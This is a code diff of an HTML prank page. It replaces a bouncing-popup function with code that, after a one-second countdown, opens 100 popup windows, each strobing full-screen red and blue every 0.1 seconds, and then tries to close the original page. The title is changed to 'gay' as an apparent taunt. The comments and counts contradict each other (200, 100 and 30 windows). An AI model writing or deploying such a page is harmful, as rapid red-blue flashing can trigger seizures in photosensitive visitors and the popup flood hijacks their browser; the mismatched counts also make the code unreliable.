@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>gay69</title>
+    <title>gay</title>
     <style>
         body {
             display: flex;
@@ -30,37 +30,6 @@
             }
         }
 
-        function bounceWindow(popup) {
-            if (!popup) return;
-
-            // Initialize position and velocity
-            let left = Math.random() * (window.screen.availWidth - 400);
-            let top = Math.random() * (window.screen.availHeight - 300);
-            let velocityX = 9; // Horizontal speed
-            let velocityY = 9; // Vertical speed
-
-            const interval = setInterval(() => {
-                // Update position
-                left += velocityX;
-                top += velocityY;
-
-                // Check for collisions with screen edges and reverse direction if needed
-                if (left <= 0 || left >= window.screen.availWidth - 400) {
-                    velocityX *= -1; // Reverse horizontal direction
-                }
-                if (top <= 0 || top >= window.screen.availHeight - 300) {
-                    velocityY *= -1; // Reverse vertical direction
-                }
-
-                // Move the popup
-                try {
-                    popup.moveTo(left, top);
-                } catch (e) {
-                    clearInterval(interval); // Stop movement if popup is inaccessible
-                }
-            }, 30); // Adjust interval for smoother or faster movement
-        }
-
         function startCountdown() {
             let seconds = 1;
             const countdownElem = document.getElementById('countdown');
@@ -69,6 +38,9 @@
                 if (countdownElem) countdownElem.textContent = seconds;
                 if (seconds <= 0) {
                     clearInterval(interval);
+
+                    // Open 200 `about:blank` windows
+                    const popups = [];
                     for (let i = 0; i < 100; i++) {
                         const popup = window.open(
                             'about:blank',
@@ -76,18 +48,32 @@
                             `width=400,height=300,left=0,top=0`
                         );
                         if (popup) {
+                            popups.push(popup);
+
+                            // Write flashing lights content
                             popup.document.write(`
                                 <html>
-                                    <body style="display:flex;justify-content:center;align-items:center;height:100vh;">
-                                        <h2>This window will close in 30 seconds...</h2>
+                                    <body style="margin:0;height:100vh;display:flex;justify-content:center;align-items:center;">
+                                        <div id="flasher" style="width:100%;height:100%;background-color:red;"></div>
                                         <script>
-                                            setTimeout(function() { window.close(); }, 30000);
+                                            let isRed = true;
+                                            setInterval(() => {
+                                                const flasher = document.getElementById('flasher');
+                                                if (flasher) {
+                                                    flasher.style.backgroundColor = isRed ? 'blue' : 'red';
+                                                    isRed = !isRed;
+                                                }
+                                            }, 100); // 0.1 seconds
                                         <\/script>
                                     </body>
                                 </html>
                             `);
-                            bounceWindow(popup); // Start bouncing the window
                         }
+                    }
+
+                    // Once all about:blank windows are opened, close the main window
+                    if (popups.length === 30) {
+                        window.close();
                     }
                 }
             }, 1000);
